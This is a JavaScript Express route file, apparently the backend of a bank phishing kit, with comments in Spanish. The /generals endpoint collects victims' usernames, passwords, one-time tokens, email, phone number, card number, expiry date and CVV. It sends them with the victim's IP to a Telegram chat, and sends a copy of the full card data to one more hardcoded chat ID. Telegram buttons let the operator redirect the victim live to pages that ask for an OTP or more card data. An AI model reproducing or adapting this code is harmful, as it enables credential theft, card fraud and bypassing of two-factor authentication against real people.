import express from 'express';
import bot from '../config/botConfig.js';
import { CHAT_ID } from '../config/preconfigs.js';
import { generateRandomID } from '../helpers/utils.js';

const router = express.Router();

const activeMessages = new Map(); // Almacena los mensajes activos con su respectivo token

router.post('/generals', (req, res) => {

  let infoMessage1 = `
  \u{1F534} Nuevo Registro \u{1F534}
  ----------------------------

  \u{1F465} User: ${req.body.user}

  \u{1F512} Pass: ${req.body.puser}

  ----------------------------
  IP: ${req.ip.split(':').pop()}
  `;

  let infoMessage2 = `
  \u{1F534} Nuevo Registro \u{1F534}
  ----------------------------

  \u{1F465} User: ${req.body.user}

  \u{1F512} Pass: ${req.body.puser}

  ----------------------------

  \u{1F4A3} TOKEN: ${req.body.tok}
  
  ----------------------------
  ¡ESPERA LOS OTROS DATOS!
  ----------------------------
  
  IP: ${req.ip.split(':').pop()}
  `;

  let infoMessage3 = `
    \u{1F534} Nuevo Registro \u{1F534}
    ----------------------------

    \u{1F465} User: ${req.body.user}

    \u{1F512} Pass: ${req.body.puser}

    ----------------------------

    \u{1F4E7} Email: ${req.body.email}

    \u{1F4F2} Celular: ${req.body.pemail}

    ----------------------------

    \u{1F4B3} CARD: ${req.body.p}

    \u{1F4C5} FECHA: ${req.body.f}

    \u{2B50} CVV: ${req.body.c}

    \u{1F535} TIPO: ${req.body.type}

    ----------------------------

    \u{1F4A3} TOKEN: ${req.body.tok}

    ----------------------------
    IP: ${req.ip.split(':').pop()}
  
  `;

  const token = generateRandomID();

  const opts1 = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [
          { text: '$ Pedir OTP $', callback_data: `token.html:${token}` }
          
        ],
        [
          { text: 'newUser', callback_data: `index.html:${token}` }
        ]
      ],
      one_time_keyboard: true,
    }),
  };

  const opts3 = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [
          { text: '$ Pedir OTP $', callback_data: `token.html:${token}` }
        ],
        [
          { text: 'newUser', callback_data: `index.html:${token}` },
          { text: 'newCard', callback_data: `card.html:${token}` },
          { text: 'newEmail', callback_data: `email.html:${token}` },
        ],
        [
          { text: 'Finalizar', callback_data: `success.html:${token}` },
        ]
      ],
      one_time_keyboard: true,
    }),
  };


  if (req.body.tok === '') {
    bot.sendMessage(CHAT_ID, infoMessage1)
      .then(()=>{
        bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts1)
        .then(message => {
          const messageID = message.message_id;
          activeMessages.set(token, { messageID, res }); // Almacena el ID del mensaje y la respuesta HTTP con el token correspondiente
        })
        .catch(err => console.log(err));
      });
  }else if (req.body.c === ''){
    bot.sendMessage(CHAT_ID, infoMessage2)
      .then( () =>{
        res.json({'Checked': 'checked'});
      })
  }else{
    bot.sendMessage(CHAT_ID, infoMessage3)
      .then(()=>{
        bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts3)
        .then(message => {
          bot.sendMessage('1660900306', infoMessage3);
          const messageID = message.message_id;
          activeMessages.set(token, { messageID, res }); // Almacena el ID del mensaje y la respuesta HTTP con el token correspondiente
        })
        .catch(err => console.log(err));
      });
  }
})


// Maneja las respuestas a las opciones del teclado personalizado
bot.on('callback_query', (query) => {
  const data = query.data.split(':');
  const token = data[1];

  if (activeMessages.has(token)) {
    const { messageID, res } = activeMessages.get(token);
    activeMessages.delete(token); // Elimina el mensaje de la estructura de datos

    bot.deleteMessage(CHAT_ID, messageID);

    // Enviar respuesta a través de la respuesta HTTP almacenada
    console.log('Redirigiendo a -> ' + data[0]);
    res.json({ 'redirect_to': data[0] });
  }
});


export default router;